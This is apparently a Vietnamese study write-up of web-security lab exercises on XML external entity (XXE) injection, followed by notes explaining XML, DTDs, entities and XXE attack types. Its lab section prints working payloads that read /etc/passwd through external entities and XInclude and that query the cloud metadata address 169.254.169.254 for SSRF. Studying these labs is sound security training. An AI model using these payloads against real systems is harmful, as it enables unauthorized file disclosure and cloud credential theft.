# 1. LAB

## 1. Lab: Exploiting XXE using external entities to retrieve files ##

Vào request POST check stock, thêm `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` và đổi giá trị productId bằng `&xxe;`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Ta được 

<img width="392" height="266" alt="image" src="https://github.com/user-attachments/assets/162c7f35-c76d-4d74-b85b-7cf1ddcd55ee" />

## 2. Lab: Exploiting XXE to perform SSRF attacks ##

Sau khi insert vào, ta thấy hiện thông báo lỗi như sau

<img width="957" height="257" alt="image" src="https://github.com/user-attachments/assets/5d0734f7-5372-4672-be4c-ad909ff1bb8b" />

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Sau khi thêm `latest` vào sau đường dẫn, thông báo lỗi thanh đổi thành `"Invalid product ID: meta-data"`

Tiếp tục, ta update dần dựa vào thông báo lỗi và được kết quả như sau 

<img width="929" height="138" alt="image" src="https://github.com/user-attachments/assets/aafae305-1160-4b06-9db4-d43c8ee8c34a" />


## 3. Lab: Exploiting XInclude to retrieve files ##

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

<img width="935" height="104" alt="image" src="https://github.com/user-attachments/assets/277482c7-3782-4a98-b8c0-e6e7a9a3fd5c" />

Ta sẽ thực hiện tấn công bằng cách chèn file XML vào giá trị productId

<img width="876" height="234" alt="image" src="https://github.com/user-attachments/assets/68aaa557-0e97-4f03-a281-158952519207" />

## 4. Lab: Exploiting XXE via image file upload ##













# 2. NOTE

## 1. Định nghĩa ##

-  ( XML External Entity Injection ) là lổ hổng xảy ra khi ứng dụng xử lý  XML không an toàn, cho phép dữ liệu XML do người dùng kiểm soát khai báo hoặc sử dụng external entity
- XXE có thể
+ Đọc file trên máy chủ ( file cấu hình chứa thông tin nhạy cảm )
+ Gửi request từ máy chủ đến hệ thông nội bộ
+ Trích xuất dữ liệu qua kết nối ngoài hoặc thông báo lỗi trường hợp Blind

## 2. Giải thích XML, DTD và Entity ##

- XML là định dạng dữ liệu có cấu trúc bằng các thẻ
Ví dụ
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

- Entity là một tên đại diện cho 1 giá trị
```
<!DOCTYPE stockCheck [
    <!ENTITY product "381">
]>
<stockCheck>
    <productId>&product;</productId>
</stockCheck>
```

- DTD ( Document Type Definition ) cho phép khai báo cấu trúc tài liệu XML, bao gồm các entity

## 3. Các loại tấn công ##

- XXE đọc file: Extrnal entity tham chiếu đến file cục bộ. Nếu parser đọc được file và ứng dụng trả dữ liệu ra ngoài, thông tin có thể bị lộ
- XXE dẫn đến SSRF: Entity tham chiếu đến URL. Nếu parser truy cập URL đó, server có thể phát sinh request đến hệ thống mà server truy cập được
- Blind XXE - Out-of-ban: Response không hiển thị dữ liệu nhạy cảm nhưng có thể quan sát tương tác mang phát sinh từ server trong môi trường kiểm thử được phép
- Blind XXE qua lỗi: Thông báo lỗi của parser có thể tiết lộ thông tin về cách XML được xử lý hoặc dữ liệu liên quan đến quá trình phân 




